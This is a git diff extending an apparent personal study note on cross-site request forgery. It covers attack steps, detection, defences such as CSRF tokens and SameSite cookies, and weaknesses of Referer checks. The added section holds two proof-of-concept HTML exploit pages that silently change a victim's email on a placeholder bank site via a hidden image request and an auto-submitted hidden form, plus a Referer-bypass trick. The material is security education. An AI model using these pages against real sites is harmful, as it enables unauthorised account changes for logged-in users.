@@ -42,7 +42,7 @@ user has to be already logged in to the application.
 
 ## Steps to CSRF attack:
 
-**1. attacker send the victim a malicious link that will conduct the CSRF attack.**
+**1. attacker send the victim a malicious link/ script that will conduct the CSRF attack.**
 
 ![send phising mail](./images/step1CSRF.png)
     sent a phising link - will change the users email address registerd on the bank website.
@@ -67,7 +67,8 @@ for a webiste to be tagged as vulnerable to CSRF:
     - example- `https://bank.com/email/chnage?email=attacker@gmail.com`
     - the paramete (email) here is predictable 
 
-    hence to defend from CSRF attack - **`CSRF token`** is added with the request parameter.
+    hence to defend from CSRF attack - **`CSRF token`** is added with the request parameter.  
+    CSRF token are added with the request parameter each time and it is unpredictable. 
 
 ## How to find CSRF vulnerabilty:
 
@@ -110,6 +111,164 @@ for a webiste to be tagged as vulnerable to CSRF:
 
 #### 3. review the code to ensure the built in defenses have not been disabled 
 - devs do this while integreting their app with other app
-
+ 
 #### 4. review each and every functionality to ensure that the CSRF defense has been applied 
 - some times dev intoduce custom code etc
+
+## How to Exploit CSRF vulnerabilty:
+
+**For majority of application there are 2 scenarios:**
+
+### 1. `GET` request scenario:
+
+You shoud NOT use `GET` method in oder to submit Data to app - Intoduces potential attack vectors.
+1. GET request can be triggered acidentally.
+2. GET parameters are visbile in the URL.
+3. GET request can be cached.
+4. Makes CSRF attacks easier.  
+    ```<img src="https://bank.com/transfer?amount=1000">```
+
+victim should click on an malicious application, that will run a script containing this request:
+
+``` 
+GET https://bank.com/email/change?email=test@test.ca HTTP/1.1 
+```
+
+#### Expolit:
+
+```
+<html>
+    <body> 
+        <h1> hello world! </h1>
+        <img src = "https://bank.com/email/change?=attackers@gmail.ca" 
+        width = "0" height="0" border = "0">
+    </body>
+</html>
+```
+1. victim click on the link.
+
+2. The malicious app loads
+
+3. Browser visit `<img> src` URL   
+
+4. the broswer look for cookie for the `bank.com` domain.
+
+5. cookie found - user authenticated cookie.
+
+6. cookie gets attached with the request and is sent 
+
+7. email id is changed.
+
+### 2. `POST` request scenario:
+
+``` 
+POST /email/change HTTP/1.1
+Host: https://bank.com
+...
+email - test@test.ca
+```
+
+#### Exploit script:
+```
+<html>
+    <body>
+        <h1>Hello world</h1>
+        <iframe style="dispay:none" "name="csrf-iframe></iframe>
+        <form action="https://bank.com/email/change/" method="POST" target="csrf-iframe" id="csrf-form">
+            <input type="hidden" name="email" value="test@test.ca">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
+```
+
+##### `<form>` has `target` :
+
+tells where will the form's response opens after submition.`(window/tab/frame)`  
+
+Used to tell the form to run within an ***invisible iframe*** element.  
+
+When the user click on the webiste (malicious), he is not redirected to email change functionality of `bank.com`
+
+### Automated Exploitation tools:
+Web Application Vulnerability Scanners(WAVS)
+1. Burp suite pro
+2. arachni
+3. wapiti
+4. acunetix
+5. w3af
+
+### How to prevent CSRF vulnerability:
+
+1. **Primary Defences:**  
+
+    Use CSRF token in relevant requests.  
+
+    CSRF token: 
+    - randomly generated long string.
+
+    - passed along with request as a parameter
+
+    - tied to user session. ***why?***
+
+        - if it is ***not*** tied to a users session, the attacker can create its own account in the targeted app 
+        - generate a CSRF token for his account 
+        - use it in place for users's CSRF parameter in the request 
+        - It will be an successful request. coz target app backend wont check the session's CSRF.
+    - validated before the relevent action is executed.
+
+    **How CSRF token is transmitted?**
+    1. ***hidden field of an HTML `form`*** that is submitted using `POST` method and CSRF token is passed in the parameter.
+
+    2. Custom request header - not used as much
+
+    3. Token submitted in the URL query string (as parameters) - less secure way.
+
+    4. tokens transmitted within cookies. - never do it 
+
+    **How CSRF token is validated?**
+    1. generated and stored server-side
+
+    2. when performing a request, a validation should be performed - verify submitted token = stored token in the user's session.
+
+    3. validation should be performed for all type of HTTP methods (GET, POST etc)
+
+    4. token not submitted - request rejected and log it. 
+
+2. **Additional Defences:**  
+
+    use of sameSite cookies.  
+
+    the `sameSite` attribute added to `set-cookie` response header when a server issue a cookie, typically during login or session initialization.
+
+    Used to control whether cookies are submitted in cross-site requests.  
+
+    ```
+    Set-Cookie: session=test; SameSite=strict
+    Set-Cookie: session=test; SameSite=Lax
+    Set-Cookie: flavor=choco; SameSite=None; Secure
+    ```
+
+3. **Inadequate defences:** (can be bypassed but are used in real life scenario)  
+
+    use of `referer` header.
+
+    `referer` HTTP request header - contains an absolute or partial address of the page making the requests.
+
+    > tracks where the request came from 
+
+    #### why it is used?
+    the application usually check the if,
+    > referer header = domain of the application
+    
+    if equal, accept the request
+    else, reject the request
+
+    not the best way to deal with CSRF attacks.
+    1. Referer header can be `spoofed`
+    2. defense can be bypassed
+        - example #1 - if it is not present - the application dont check for it.
+        - example #2 - referer header is only checked to see if it contains the domain and exact match is not made.  
+        if you include domain of the app as query parameter in a URL
+            > www.malsite.com/?bank.com
